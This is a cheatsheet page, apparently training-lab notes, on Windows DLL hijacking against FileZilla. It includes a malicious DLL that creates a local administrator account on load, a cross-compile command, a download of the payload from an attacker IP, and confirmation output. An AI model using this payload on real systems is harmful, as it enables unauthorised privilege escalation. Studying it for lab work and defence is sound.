# DLL Hijacking

Standard DLL search order on current Windows versions
>``` shell
>1. The directory from which the application loaded.
>2. The system directory.
>3. The 16-bit system directory.
>4. The Windows directory. 
>5. The current directory.
>6. The directories that are listed in the PATH environment variable.
>```

Displaying information about the running service FileZilla
>``` shell
>PS C:\Users\steve> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
>
># ========== Expected Result ==========
>displayname
>-----------
>
>FileZilla 3.63.1
>KeePass Password Safe 2.51.1
>Microsoft Edge
>Microsoft Edge Update
>Microsoft Edge WebView2 Runtime
>
>Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
>Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913
>Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913
>Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913
># =====================================
>```

Displaying permissions on the binary of FileZilla
>``` shell
>PS C:\Users\steve> echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
>
>PS C:\Users\steve> type 'C:\FileZilla\FileZilla FTP Client\test.txt'
>
># ========== Expected Result ==========
>test
># =====================================
>```

Appearing Prompt for UAC
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/DLL-Hijacking-1.png)

Add Filter for filezilla.exe
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/DLL-Hijacking-2.png)

Clear the current logged events
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/DLL-Hijacking-3.png)

Add Filters looking for CreateFile operations on paths containing TextShaping.dll
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/DLL-Hijacking-4.png)

Resulting events after applying the filters
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/DLL-Hijacking-5.png)

Code example of a basic DLL in C++
>``` shell
>BOOL APIENTRY DllMain(
>HANDLE hModule,// Handle to DLL module
>DWORD ul_reason_for_call,// Reason for calling function
>LPVOID lpReserved ) // Reserved
>{
>    switch ( ul_reason_for_call )
>    {
>        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
>        break;
>        case DLL_THREAD_ATTACH: // A process is creating a new thread.
>        break;
>        case DLL_THREAD_DETACH: // A thread exits normally.
>        break;
>        case DLL_PROCESS_DETACH: // A process unloads the DLL.
>        break;
>    }
>    return TRUE;
>}
>```

C++ DLL example code from Microsoft
>``` shell
>#include <stdlib.h>
>#include <windows.h>
>
>BOOL APIENTRY DllMain(
>HANDLE hModule,// Handle to DLL module
>DWORD ul_reason_for_call,// Reason for calling function
>LPVOID lpReserved ) // Reserved
>{
>    switch ( ul_reason_for_call )
>    {
>        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
>        int i;
>  	     i = system ("net user dave3 password123! /add");
>  	     i = system ("net localgroup administrators dave3 /add");
>        break;
>        case DLL_THREAD_ATTACH: // A process is creating a new thread.
>        break;
>        case DLL_THREAD_DETACH: // A thread exits normally.
>        break;
>        case DLL_PROCESS_DETACH: // A process unloads the DLL.
>        break;
>    }
>    return TRUE;
>}
>```

Cross-Compile the C++ Code to a 64-bit DLL
>``` shell
>kali@kali:~$ x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
>```

Download compiled DLL
>``` shell
>PS C:\Users\steve> iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
>```

Confirming that the dave3 was created as local administrator
>``` shell
>PS C:\Users\steve> net user
>
># ========== Expected Result ==========
>User accounts for \\CLIENTWK220
>
>-------------------------------------------------------------------------------
>Administrator            BackupAdmin              dave
>dave3                    daveadmin                DefaultAccount
>Guest                    offsec                   steve
>WDAGUtilityAccount
>The command completed successfully.
># =====================================
>
>PS C:\Users\steve> net localgroup administrators
>
># ========== Expected Result ==========
>Alias name     administrators
>Comment        Administrators have complete and unrestricted access to the computer/domain
>
>Members
>
>-------------------------------------------------------------------------------
>Administrator
>BackupAdmin
>dave3
>daveadmin
>offsec
>The command completed successfully.
># =====================================
>```

Lab 1 - Follow the steps from this section on CLIENTWK220 (VM #1) to identify the missing DLL, cross-compile your own DLL, and place it in a directory that it gets executed when the service FileZilla FTP Client is started. After placing the malicious DLL wait several minutes for a high privileged user to start the application, obtain code execution, an interactive shell, or access to the GUI and enter the flag, which can be found on the desktop of daveadmin.
>``` shell
>
>```
>
